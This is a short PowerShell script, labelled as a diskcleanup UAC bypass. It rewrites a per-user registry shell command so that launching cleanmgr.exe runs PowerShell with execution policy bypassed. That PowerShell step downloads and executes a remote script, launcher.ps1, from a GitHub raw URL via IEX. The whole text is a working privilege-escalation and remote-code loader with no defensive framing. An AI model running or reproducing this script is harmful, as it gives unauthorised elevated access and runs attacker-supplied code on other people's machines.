# This script uses the diskcleanup.exe UAC bypass.
$RegKey = "HKCU\Software\Classes\shell\open\command"
Set-ItemProperty -Path $RegKey -Name "(Default)" -Value "powershell.exe -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/serpiajonna-bit/hosting/main/launcher.ps1')\""
Set-ItemProperty -Path $RegKey -Name "DelegateExecute" -Value ""
Start-Process "C:\Windows\System32\cleanmgr.exe" -ArgumentList "/autoclean"